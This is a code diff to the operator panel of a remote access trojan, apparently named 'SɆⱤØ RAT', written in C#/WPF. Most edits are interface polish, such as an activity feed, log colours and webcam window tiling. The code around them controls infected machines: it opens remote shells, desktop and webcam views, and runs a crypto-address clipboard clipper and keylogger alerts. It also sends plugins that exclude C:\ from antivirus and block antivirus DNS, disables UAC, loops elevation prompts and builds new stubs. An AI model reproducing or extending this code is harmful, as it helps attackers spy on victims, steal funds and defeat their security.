@@ -59,13 +59,103 @@ public partial class ServerWindow : Window
     private const int LogMaxLines = 2000;
     private const int LogTrimTo   = 1000;
     private System.Windows.Documents.Paragraph? _logPara;
-    private int _logUnseenCount;   // badge counter — reset when user opens the Logs tab
+
+    // Activity panel — tracks recent operations for the bottom status area
+    private readonly List<ActivityEntry> _recentActivity = [];
+    private record ActivityEntry(string Action, string Target, string Status, DateTime Time);
+
+    public static void ReportGlobalActivity(string action, string target, string status)
+    {
+        if (Application.Current?.MainWindow is ServerWindow main)
+            main.Dispatcher.BeginInvoke(() => main.AddActivity(action, target, status));
+    }
+
+    private void AddActivity(string action, string target, string status)
+    {
+        var entry = new ActivityEntry(action, target, status, DateTime.Now);
+        _recentActivity.Add(entry);
+        if (_recentActivity.Count > 10) // Keep ~10 items
+            _recentActivity.RemoveAt(0);
+        RefreshActivityFeed();
+    }
+    private static readonly Brush _brushActivityRunning = MakeBrush(0x38, 0xBD, 0xF8); // sky blue
+    private static readonly Brush _brushActivityComplete = MakeBrush(0x4A, 0xDE, 0x80); // green
+    private static readonly Brush _brushActivityFailed = MakeBrush(0xF8, 0x71, 0x71); // red
+    private static readonly Brush _brushActivityUpload = MakeBrush(0xA7, 0x8B, 0xFA); // purple
+    private static readonly Brush _brushActivityDownload = MakeBrush(0x34, 0xD3, 0x99); // emerald
+    private static readonly Brush _brushActivityRdp = MakeBrush(0xFB, 0xBF, 0x24); // amber
+    private static readonly Brush _brushActivityCmd = MakeBrush(0xF4, 0x3F, 0x5E); // rose
+
+    private void SetStatus(string text, string? activityAction = null, string? activityTarget = null, string? activityStatus = null)
+    {
+        if (TxtStatusBar != null) TxtStatusBar.Text = text;
+        if (activityAction != null)
+            AddActivity(activityAction, activityTarget ?? "", activityStatus ?? "complete");
+    }
+
+    private void RefreshActivityFeed()
+    {
+        if (ActivityFeedPanel == null) return;
+        ActivityFeedPanel.Children.Clear();
+        foreach (var a in _recentActivity)
+        {
+            var isRunning = a.Status == "running";
+            var isFailed = a.Status == "failed";
+            
+            var emoji = "⚡";
+            var actionColor = _brushLogDefault;
+            
+            if (a.Action.Contains("Upload", StringComparison.OrdinalIgnoreCase)) { emoji = "⬆️"; actionColor = _brushActivityUpload; }
+            else if (a.Action.Contains("Download", StringComparison.OrdinalIgnoreCase)) { emoji = "⬇️"; actionColor = _brushActivityDownload; }
+            else if (a.Action.Contains("desktop", StringComparison.OrdinalIgnoreCase)) { emoji = "🖥️"; actionColor = _brushActivityRdp; }
+            else if (a.Action.Contains("Kill", StringComparison.OrdinalIgnoreCase)) { emoji = "💀"; actionColor = _brushActivityCmd; }
+            else if (a.Action.Contains("command", StringComparison.OrdinalIgnoreCase)) { emoji = "⌨️"; actionColor = _brushActivityCmd; }
+
+            var icon = isRunning ? "⋯ " : isFailed ? "✗ " : "✓ ";
+            var brush = isRunning ? _brushActivityRunning : isFailed ? _brushActivityFailed : _brushActivityComplete;
+            
+            string timeFmt = (UiPrefs.GetInt("ShowSeconds", 0) == 1) ? "h:mm:ss tt" : "h:mm tt";
+            var time = a.Time.ToString(timeFmt);
+            
+            var tb = new TextBlock 
+            { 
+                FontFamily = new System.Windows.Media.FontFamily("Consolas"), 
+                FontSize = 10,
+                Margin = new Thickness(2, 1, 0, 1)
+            };
+            
+            tb.Inlines.Add(new System.Windows.Documents.Run(time + "  ") { Foreground = _brushLogTime });
+            tb.Inlines.Add(new System.Windows.Documents.Run(icon) { Foreground = brush });
+            tb.Inlines.Add(new System.Windows.Documents.Run(emoji + " " + a.Action + " ") { Foreground = actionColor });
+            if (!string.IsNullOrEmpty(a.Target))
+                tb.Inlines.Add(new System.Windows.Documents.Run(a.Target) { Foreground = _brushLogIP });
+
+            ActivityFeedPanel.Children.Add(tb);
+        }
+    }
+
+    private bool _autoScrollActivity = true;
+    private void ActivityLogScroll_ScrollChanged(object sender, ScrollChangedEventArgs e)
+    {
+        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
+            _autoScrollActivity = (ActivityLogScroll.VerticalOffset + ActivityLogScroll.ViewportHeight >= ActivityLogScroll.ExtentHeight - 10);
+
+        if (_autoScrollActivity && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
+            ActivityLogScroll.ScrollToEnd();
+    }
 
     // Coloured log brushes (frozen = thread-safe, allocated once)
-    private static readonly Brush _brushLogError   = MakeBrush(0xEF, 0x44, 0x44);
-    private static readonly Brush _brushLogGood    = MakeBrush(0x4A, 0xDE, 0x80);
-    private static readonly Brush _brushLogDll     = MakeBrush(0x60, 0xA5, 0xFA);
-    private static readonly Brush _brushLogDefault = MakeBrush(0x88, 0x90, 0xB8);
+    private static readonly Brush _brushLogError      = MakeBrush(0xF8, 0x71, 0x71); // Soft Coral Red
+    private static readonly Brush _brushLogSuccess    = MakeBrush(0x4A, 0xDE, 0x80); // Mint Green
+    private static readonly Brush _brushLogConnect    = MakeBrush(0x2D, 0xD4, 0xBF); // Teal/Emerald
+    private static readonly Brush _brushLogDisconnect = MakeBrush(0xFB, 0x92, 0x3C); // Warm Orange
+    private static readonly Brush _brushLogAdmin      = MakeBrush(0xC0, 0x84, 0xFC); // Lavender Purple
+    private static readonly Brush _brushLogTask       = MakeBrush(0x38, 0xBD, 0xF8); // Sky Blue
+    private static readonly Brush _brushLogDefault    = MakeBrush(0x94, 0xA3, 0xB8); // Slate Gray
+    private static readonly Brush _brushLogTime       = MakeBrush(0x50, 0x58, 0x70); // Dim muted blue-gray for timestamp
+    private static readonly Brush _brushLogIP         = MakeBrush(0xF4, 0x72, 0xB6); // Pink for IP addresses
+    private static readonly Brush _brushLogGood       = _brushLogSuccess;
+    private static readonly Brush _brushLogDll        = _brushLogTask;
     private static Brush MakeBrush(byte r, byte g, byte b)
     {
         var b2 = new SolidColorBrush(Color.FromRgb(r, g, b));
@@ -110,6 +200,14 @@ public partial class ServerWindow : Window
     {
         InitializeComponent();
 
+        try
+        {
+            var version = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
+            if (version != null)
+                TxtVersionNumber.Text = $" v{version.Major}.{version.Minor}.{version.Build}";
+        }
+        catch { }
+
         _dashTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
         _dashTimer.Tick += (_, _) => RefreshDashboard();
 
@@ -138,8 +236,11 @@ public partial class ServerWindow : Window
             view.SortDescriptions.Add(new System.ComponentModel.SortDescription(
                 nameof(Data.ConnectedClient.HasTag), System.ComponentModel.ListSortDirection.Descending));
             GridClients.ItemsSource = view;
+            LoadColumnVisibility();
             RestoreGridColumnWidths();
             SetupGridColumnPersistence();
+            PopulateColumnVisibilityMenu();
+            UpdateSettingsCheckboxStates();
 
             // Initialise diagnostic logger (enabled by default)
             DiagnosticLogger.Init();
@@ -148,6 +249,7 @@ public partial class ServerWindow : Window
             Log("[*] Server ready. Click START to listen.");
             RefreshAllClients();
             LoadConfig();
+            LoadSoundPreferences();
             NotificationService.Initialize(SettingsNotifySound.IsChecked == true);
             // Initialize default host if empty
             if (BldHosts.Items.Count == 0)
@@ -334,8 +436,17 @@ public partial class ServerWindow : Window
         var display = clientId.Length > 8 ? clientId[..8] : clientId;
         var line = $"[{DateTime.Now:HH:mm:ss}]  [{display}]  {data.Type}  {data.Original}  →  {data.Replaced}\n";
         ClipperLog.AppendText(line);
-        ClipperLogScroll.ScrollToEnd();
         ClipperCountTxt.Text = $"  —  {_clipperCount} replacement{(_clipperCount != 1 ? "s" : "")}";
+    }
+
+    private bool _autoScrollClipper = true;
+    private void ClipperLogScroll_ScrollChanged(object sender, ScrollChangedEventArgs e)
+    {
+        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
+            _autoScrollClipper = (ClipperLogScroll.VerticalOffset + ClipperLogScroll.ViewportHeight >= ClipperLogScroll.ExtentHeight - 10);
+
+        if (_autoScrollClipper && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
+            ClipperLogScroll.ScrollToEnd();
     }
 
     // ── Server-side Telegram notification (global counter) ──────────────────────
@@ -422,8 +533,7 @@ public partial class ServerWindow : Window
             UpdateClientCount();
             ScreenPanel.Children.Clear();
             _screenTiles.Clear();
-            TxtStatusLeft.Text = "SɆⱤØ RAT";
-            TxtStatusLeft.Foreground = new SolidColorBrush(Color.FromRgb(0x2E, 0x30, 0x48));
+            // Status is now handled by the Activity Panel
             Log("[*] Server stopped.");
         }
         else
@@ -516,8 +626,7 @@ public partial class ServerWindow : Window
                 BtnStartStop.Style = (Style)FindResource("SRedBtn");
                 _dashTimer.Start();
                 _uptimeTimer.Start();
-                TxtStatusLeft.Text = $"● Listening on :{port}";
-                TxtStatusLeft.Foreground = (Brush)FindResource("GreenBrush");
+                // Status is now handled by the Activity Panel
 
                 // Discord RPC
                 if (SettingsDiscordRPC.IsChecked == true)
@@ -544,7 +653,7 @@ public partial class ServerWindow : Window
             : (Brush)FindResource("RedBrush");
 
         ServerDot.Fill = brush;
-        TxtServerStatus.Text = running ? "Running" : "Stopped";
+        TxtServerStatus.Text = running ? "Listening" : "Not Listening";
     }
 
     private void UpdateClientCount()
@@ -886,10 +995,13 @@ public partial class ServerWindow : Window
     private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
-        if (_server == null) return;
+        if (_server == null || clients.Count == 0) return;
+        string msg = clients.Count == 1
+            ? $"Disconnect '{clients[0].Username}@{clients[0].IP}'?"
+            : $"Disconnect {clients.Count} clients?";
+        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
         foreach (var client in clients)
         {
-            // Send Disconnect packet so stub sets ShouldReconnect=false before stream closes
             try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
             await Task.Delay(150);
             _server.DisconnectClient(client.Id);
@@ -900,10 +1012,12 @@ public partial class ServerWindow : Window
 
     private void RestoreGridColumnWidths()
     {
-        for (int i = 0; i < GridClients.Columns.Count; i++)
+        foreach (var col in GridClients.Columns)
         {
-            int w = UiPrefs.GetInt($"Col_{i}", 0);
-            if (w > 0) GridClients.Columns[i].Width = new System.Windows.Controls.DataGridLength(w);
+            string header = col.Header?.ToString() ?? "";
+            if (string.IsNullOrEmpty(header)) continue;
+            int w = UiPrefs.GetInt($"ColWidth_{header}", 0);
+            if (w > 0) col.Width = new System.Windows.Controls.DataGridLength(w);
         }
     }
 
@@ -918,10 +1032,12 @@ public partial class ServerWindow : Window
 
     private void SaveGridColumnWidths()
     {
-        for (int i = 0; i < GridClients.Columns.Count; i++)
+        foreach (var col in GridClients.Columns)
         {
-            double w = GridClients.Columns[i].ActualWidth;
-            if (w > 0) UiPrefs.Set($"Col_{i}", (int)w);
+            string header = col.Header?.ToString() ?? "";
+            if (string.IsNullOrEmpty(header)) continue;
+            double w = col.ActualWidth;
+            if (w > 0) UiPrefs.Set($"ColWidth_{header}", (int)w);
         }
     }
 
@@ -934,7 +1050,21 @@ public partial class ServerWindow : Window
         }
     }
 
-    private void OpenFeatureWindow<T>(string clientId, Func<T> factory) where T : Window
+    private void GridClients_SelectionChanged(object sender, SelectionChangedEventArgs e)
+    {
+        var count = GridClients.SelectedItems.Count;
+        if (count > 0)
+        {
+            TxtSelectedCount.Text = $"{count} selected";
+            BorderSelectedCount.Visibility = Visibility.Visible;
+        }
+        else
+        {
+            BorderSelectedCount.Visibility = Visibility.Collapsed;
+        }
+    }
+
+    internal void OpenFeatureWindow<T>(string clientId, Func<T> factory) where T : Window
     {
         string key = $"{clientId}:{typeof(T).Name}";
         if (_featureWindows.TryGetValue(key, out var existing))
@@ -945,15 +1075,40 @@ public partial class ServerWindow : Window
             return;
         }
         var win = factory();
+
+        // Automatically set title and header label on creation
+        string tag = "";
+        if (_server != null && _server.ConnectedClients.TryGetValue(clientId, out var client))
+        {
+            tag = client.Tag;
+        }
+        string friendly = GetFriendlyWindowName(win);
+        win.Title = string.IsNullOrEmpty(tag) ? $"{friendly} — {clientId}" : $"{friendly} — {tag} ({clientId})";
+
+        if (win.FindName("TxtTitle") is TextBlock tbTitle)
+        {
+            tbTitle.Text = string.IsNullOrEmpty(tag) ? clientId : $"{tag} ({clientId})";
+        }
+        else if (win.FindName("TxtClientId") is TextBlock tbClient)
+        {
+            tbClient.Text = string.IsNullOrEmpty(tag) ? $"[ {clientId} ]" : $"[ {tag} ({clientId}) ]";
+        }
+
         _featureWindows[key] = win;
         win.Closed += (_, _) => _featureWindows.Remove(key);
         win.Show();
+
+        if (typeof(T).Name != "RemoteDesktopWindow" && typeof(T).Name != "WebcamWindow")
+        {
+            Log($"[ADMIN] {friendly} opened for client {clientId}.");
+        }
     }
 
     private void RemoteShell_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
+        LogAdminAction("Remote Shell", clients.Count, clients[0].Id);
         var server = _server;
         var newClients = new List<ConnectedClient>();
         foreach (var c in clients)
@@ -979,6 +1134,7 @@ public partial class ServerWindow : Window
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
+        LogAdminAction("Remote Desktop", clients.Count, clients[0].Id);
         var server = _server;
         var area = SystemParameters.WorkArea;
         const int step = 28, margin = 40, winW = 900, winH = 560;
@@ -1003,25 +1159,77 @@ public partial class ServerWindow : Window
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
+        LogAdminAction("Remote Webcam", clients.Count, clients[0].Id);
         var server = _server;
-        var area = SystemParameters.WorkArea;
-        const int step = 28, margin = 60, winW = 700, winH = 520;
-        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
-        int i = 0;
-        foreach (var c in clients)
+
+        // Filter to clients that actually have a camera
+        var eligible = clients.Where(c => !c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase)).ToList();
+        if (eligible.Count == 0) return;
+
+        // Determine layout mode
+        WebcamLayout layout = WebcamLayout.Cascade; // default for < 4
+        if (eligible.Count >= 4)
         {
-            if (c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase))
-                continue;
-            int s = (i % maxSteps) * step;
-            OpenFeatureWindow<WebcamWindow>(c.Id, () =>
+            var result = WebcamLayoutDialog.Prompt(this);
+            if (result == null) return; // user cancelled
+            layout = result.Value;
+        }
+
+        var area = SystemParameters.WorkArea;
+
+        if (layout == WebcamLayout.Tile)
+        {
+            // Calculate grid dimensions
+            int count = eligible.Count;
+            int cols = (int)Math.Ceiling(Math.Sqrt(count));
+            int rows = (int)Math.Ceiling((double)count / cols);
+            double tileW = area.Width / cols;
+            double tileH = area.Height / rows;
+            // Enforce minimums
+            tileW = Math.Max(tileW, 420);
+            tileH = Math.Max(tileH, 320);
+
+            int i = 0;
+            foreach (var c in eligible)
             {
-                var w = new WebcamWindow(server, c.Id);
-                w.Left = area.Left + margin + s;
-                w.Top  = area.Top  + margin + s;
-                return w;
-            });
-            i++;
-            if (clients.Count > 1) await Task.Delay(80);
+                int col = i % cols;
+                int row = i / cols;
+                double left = area.Left + col * tileW;
+                double top  = area.Top  + row * tileH;
+                double w = tileW;
+                double h = tileH;
+
+                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
+                {
+                    var win = new WebcamWindow(server, c.Id);
+                    win.Left   = left;
+                    win.Top    = top;
+                    win.Width  = w;
+                    win.Height = h;
+                    return win;
+                });
+                i++;
+                if (eligible.Count > 1) await Task.Delay(80);
+            }
+        }
+        else // Cascade
+        {
+            const int step = 28, margin = 60, winW = 700, winH = 520;
+            int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
+            int i = 0;
+            foreach (var c in eligible)
+            {
+                int s = (i % maxSteps) * step;
+                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
+                {
+                    var w = new WebcamWindow(server, c.Id);
+                    w.Left = area.Left + margin + s;
+                    w.Top  = area.Top  + margin + s;
+                    return w;
+                });
+                i++;
+                if (eligible.Count > 1) await Task.Delay(80);
+            }
         }
     }
 
@@ -1200,7 +1408,7 @@ public partial class ServerWindow : Window
                 { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
             };
             foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
-            Dispatcher.BeginInvoke(() => Log($"[+] Exclude C:\\ sent to {clients.Count} client(s)."));
+            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Exclude C:\\ sent to {clients.Count} client(s)."));
         });
     }
 
@@ -1224,7 +1432,7 @@ public partial class ServerWindow : Window
                 { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
             };
             foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
-            Dispatcher.BeginInvoke(() => Log($"[+] Block AV DNS sent to {clients.Count} client(s)."));
+            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block AV DNS sent to {clients.Count} client(s)."));
         });
     }
 
@@ -1248,7 +1456,7 @@ public partial class ServerWindow : Window
                 { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
             };
             foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
-            Dispatcher.BeginInvoke(() => Log($"[+] Block WSReset sent to {clients.Count} client(s)."));
+            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block WSReset sent to {clients.Count} client(s)."));
         });
     }
     private async void QuickDisableUac_Click(object sender, RoutedEventArgs e)
@@ -1268,7 +1476,7 @@ public partial class ServerWindow : Window
         var pkt = new Protocol.Packet { Type = Protocol.PacketType.AutoTaskShell, Data = cmd };
         foreach (var c in adminClients)
             await _server.SendToClient(c.Id, pkt);
-        Log($"[+] Disable UAC sent to {adminClients.Count} admin client(s) (takes effect after reboot).");
+        Log($"[ADMIN] Disable UAC sent to {adminClients.Count} admin client(s) (takes effect after reboot).");
     }
     #pragma warning restore CS4014
 
@@ -1382,8 +1590,8 @@ public partial class ServerWindow : Window
                 await _server.SendToClient(client.Id, packet);
             }
 
-            Log($"[+] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
-            TxtStatusBar.Text = $"File sent to {clients.Count} client(s).";
+            Log($"[ADMIN] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
+            SetStatus($"File sent to {clients.Count} client(s).");
         }
         catch (Exception ex)
         {
@@ -1426,8 +1634,8 @@ public partial class ServerWindow : Window
                 await _server.SendToClient(client.Id, packet);
             }
 
-            Log($"[+] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
-            TxtStatusBar.Text = $"Update file sent to {clients.Count} client(s).";
+            Log($"[ADMIN] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
+            SetStatus($"Update file sent to {clients.Count} client(s).");
         }
         catch (Exception ex)
         {
@@ -1454,10 +1662,10 @@ public partial class ServerWindow : Window
         {
             client.PendingUninstall = true;
             await _server.SendToClient(client.Id, packet);
-            Log($"[*] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
+            Log($"[ADMIN] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
         }
 
-        TxtStatusBar.Text = $"Uninstall sent to {clients.Count} client(s).";
+        SetStatus($"Uninstall sent to {clients.Count} client(s).");
     }
 
     // ── UAC Elevation ───────────────────────────────
@@ -1471,10 +1679,10 @@ public partial class ServerWindow : Window
         foreach (var client in clients)
         {
             await _server.SendToClient(client.Id, packet);
-            Log($"[UAC] Elevation request sent to {client.Username}@{client.IP}.");
+            Log($"[ADMIN] [UAC] Elevation request sent to {client.Username}@{client.IP}.");
         }
 
-        TxtStatusBar.Text = $"UAC elevation sent to {clients.Count} client(s).";
+        SetStatus($"UAC elevation sent to {clients.Count} client(s).");
     }
 
     private async void RequestElevationLoop_Click(object sender, RoutedEventArgs e)
@@ -1494,10 +1702,10 @@ public partial class ServerWindow : Window
         foreach (var client in clients)
         {
             await _server.SendToClient(client.Id, packet);
-            Log($"[UAC] Elevation loop started on {client.Username}@{client.IP}.");
+            Log($"[ADMIN] [UAC] Elevation loop started on {client.Username}@{client.IP}.");
         }
 
-        TxtStatusBar.Text = $"UAC loop started on {clients.Count} client(s).";
+        SetStatus($"UAC loop started on {clients.Count} client(s).");
     }
 
     // ── Tags ────────────────────────────────────────
@@ -1515,6 +1723,7 @@ public partial class ServerWindow : Window
         {
             client.Tag = dlg.TagValue;
             _store.SetTag(client.Hwid, dlg.TagValue);
+            UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
         }
 
         System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
@@ -1525,7 +1734,7 @@ public partial class ServerWindow : Window
         foreach (var c in clients)
             GridClients.SelectedItems.Add(c);
 
-        TxtStatusBar.Text = $"Tag set on {clients.Count} client(s).";
+        SetStatus($"Tag set on {clients.Count} client(s).");
     }
 
     private void SetTagRecord_Click(object sender, RoutedEventArgs e)
@@ -1550,14 +1759,17 @@ public partial class ServerWindow : Window
                 foreach (var client in _server.ConnectedClients.Values)
                 {
                     if (client.Hwid == record.Hwid)
+                    {
                         client.Tag = dlg.TagValue;
+                        UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
+                    }
                 }
             }
         }
 
         RefreshClients();
         RefreshAllClients();
-        TxtStatusBar.Text = $"Tag set on {records.Count} record(s).";
+        SetStatus($"Tag set on {records.Count} record(s).");
     }
 
     // ── Client Logs ─────────────────────────────────
@@ -1596,7 +1808,7 @@ public partial class ServerWindow : Window
 
         var hwids = string.Join("\n", clients.Select(c => c.Hwid));
         Clipboard.SetText(hwids);
-        TxtStatusBar.Text = clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs";
+        SetStatus(clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs");
     }
 
     private void CopyIP_Click(object sender, RoutedEventArgs e)
@@ -1606,7 +1818,7 @@ public partial class ServerWindow : Window
 
         var ips = string.Join("\n", clients.Select(c => c.IP));
         Clipboard.SetText(ips);
-        TxtStatusBar.Text = clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs";
+        SetStatus(clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs");
     }
 
     // ── Client search ─────────────────────────────────────────────────────────
@@ -1643,20 +1855,33 @@ public partial class ServerWindow : Window
     private bool ClientFilter(object obj)
     {
         if (obj is not ConnectedClient c) return false;
-        var q = TxtSearch?.Text?.Trim() ?? "";
-        if (string.IsNullOrEmpty(q)) return true;
 
-        // Case-insensitive search across all visible fields
-        return c.IP.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.Id.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.Tag.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.Username.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.MachineName.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.CountryDisplay.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.OS.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.ActiveWindow.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.Payload.Contains(q, StringComparison.OrdinalIgnoreCase)
-            || c.Antivirus.Contains(q, StringComparison.OrdinalIgnoreCase);
+        // 1. Search Query Filter
+        var q = TxtSearch?.Text?.Trim() ?? "";
+        if (!string.IsNullOrEmpty(q))
+        {
+            bool match = c.IP.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.Id.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.Tag.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.Username.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.MachineName.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.CountryDisplay.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.OS.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.ActiveWindow.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.Payload.Contains(q, StringComparison.OrdinalIgnoreCase)
+                || c.Antivirus.Contains(q, StringComparison.OrdinalIgnoreCase);
+            if (!match) return false;
+        }
+
+        // 2. Webcam Filter
+        if (_webcamFilterOnly && !c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase))
+            return false;
+
+        // 3. Admin Filter
+        if (_adminFilterOnly && !c.IsAdmin)
+            return false;
+
+        return true;
     }
 
     private void CopyRecordHwid_Click(object sender, RoutedEventArgs e)
@@ -1666,7 +1891,7 @@ public partial class ServerWindow : Window
 
         var hwids = string.Join("\n", records.Select(r => r.Hwid));
         Clipboard.SetText(hwids);
-        TxtStatusBar.Text = records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs";
+        SetStatus(records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs");
     }
 
     // ── Builder ─────────────────────────────────────
@@ -1790,7 +2015,7 @@ public partial class ServerWindow : Window
         if (result == MessageBoxResult.Yes)
         {
             SaveConfig();
-            TxtStatusBar.Text = "Configuration saved.";
+            SetStatus("Configuration saved.");
         }
     }
 
@@ -1870,12 +2095,12 @@ public partial class ServerWindow : Window
             if (cfg.TryGetValue("MaxClients", out var mc) && !string.IsNullOrEmpty(mc)) SettingsMaxClients.Text = mc;
             if (cfg.TryGetValue("DiscordRPC", out v)) SettingsDiscordRPC.IsChecked = v == "1";
             if (cfg.TryGetValue("NotifySound",  out v)) SettingsNotifySound.IsChecked  = v == "1";
-            if (cfg.TryGetValue("LogsBadge",    out v)) SettingsLogsBadge.IsChecked    = v != "0";
             if (cfg.TryGetValue("HideLogo", out v) && v == "1")
             {
                 SettingsHideLogo.IsChecked = true;
                 BgLogoImage.Visibility = Visibility.Collapsed;
             }
+            SettingsShowSeconds.IsChecked = UiPrefs.GetInt("ShowSeconds", 0) == 1;
             if (cfg.TryGetValue("BlockCapture", out v) && v == "1")
             {
                 SettingsBlockCapture.IsChecked = true;
@@ -1939,7 +2164,6 @@ public partial class ServerWindow : Window
                 ["MaxClients"] = SettingsMaxClients.Text.Trim(),
                 ["DiscordRPC"] = SettingsDiscordRPC.IsChecked == true ? "1" : "0",
                 ["NotifySound"] = SettingsNotifySound.IsChecked == true ? "1" : "0",
-                ["LogsBadge"]  = SettingsLogsBadge.IsChecked  == true ? "1" : "0",
                 ["HideLogo"] = SettingsHideLogo.IsChecked == true ? "1" : "0",
                 ["BlockCapture"] = SettingsBlockCapture.IsChecked == true ? "1" : "0",
                 ["TelegramEnabled"] = BldTelegramEnabled.IsChecked == true ? "1" : "0",
@@ -3092,7 +3316,7 @@ Read-Host 'Press Enter to close'
                 : $"{size / (1024.0 * 1024.0):F1} MB";
             Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
             TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
-            TxtStatusBar.Text = "Build successful.";
+            SetStatus("Build successful.");
             NotificationService.NotifyBuildSuccess();
 
             MessageBox.Show(
@@ -3172,7 +3396,7 @@ Read-Host 'Press Enter to close'
             var json = JsonSerializer.Serialize(configDict, new JsonSerializerOptions { WriteIndented = true });
             File.WriteAllText(dialog.FileName, json);
             Log($"[+] Builder: Config exported to {dialog.FileName}");
-            TxtStatusBar.Text = "Config exported.";
+            SetStatus("Config exported.");
         }
     }
 
@@ -3240,7 +3464,7 @@ Read-Host 'Press Enter to close'
             if (_server != null)
                 _server.MaxConnectedClients = max;
             Log($"[*] Max connected clients set to {max}.");
-            TxtStatusBar.Text = $"Settings applied (max clients: {max}).";
+            SetStatus($"Settings applied (max clients: {max}).");
             SaveConfig();
         }
         else
@@ -3293,21 +3517,64 @@ Read-Host 'Press Enter to close'
         SaveConfig();
     }
 
+    private void SettingsShowSeconds_Changed(object sender, RoutedEventArgs e)
+    {
+        UiPrefs.Set("ShowSeconds", SettingsShowSeconds.IsChecked == true ? 1 : 0);
+        SaveConfig();
+    }
+
+    private void LoadSoundPreferences()
+    {
+        SndChk_Intro.IsChecked = UiPrefs.GetInt("SndEnabled_Intro", 1) == 1;
+        SndChk_Startup.IsChecked = UiPrefs.GetInt("SndEnabled_Startup", 1) == 1;
+        SndChk_Shutdown.IsChecked = UiPrefs.GetInt("SndEnabled_Shutdown", 1) == 1;
+        SndChk_Connected.IsChecked = UiPrefs.GetInt("SndEnabled_Connected", 1) == 1;
+        SndChk_NewClient.IsChecked = UiPrefs.GetInt("SndEnabled_NewClient", 1) == 1;
+        SndChk_Disconnected.IsChecked = UiPrefs.GetInt("SndEnabled_Disconnected", 1) == 1;
+        SndChk_BuildSuccess.IsChecked = UiPrefs.GetInt("SndEnabled_BuildSuccess", 1) == 1;
+        SndChk_BuildError.IsChecked = UiPrefs.GetInt("SndEnabled_BuildError", 1) == 1;
+        SndChk_Clipper.IsChecked = UiPrefs.GetInt("SndEnabled_Clipper", 1) == 1;
+        SndChk_Keylogger.IsChecked = UiPrefs.GetInt("SndEnabled_Keylogger", 1) == 1;
+        SndChk_AutoTask.IsChecked = UiPrefs.GetInt("SndEnabled_AutoTask", 1) == 1;
+        SndChk_Download.IsChecked = UiPrefs.GetInt("SndEnabled_Download", 1) == 1;
+        SndChk_Upload.IsChecked = UiPrefs.GetInt("SndEnabled_Upload", 1) == 1;
+        SndChk_FileDelete.IsChecked = UiPrefs.GetInt("SndEnabled_FileDelete", 1) == 1;
+    }
+
+    private void SoundSetting_Changed(object sender, RoutedEventArgs e)
+    {
+        if (sender is System.Windows.Controls.CheckBox chk)
+        {
+            string name = chk.Name;
+            if (name.StartsWith("SndChk_"))
+            {
+                string key = name.Substring(7);
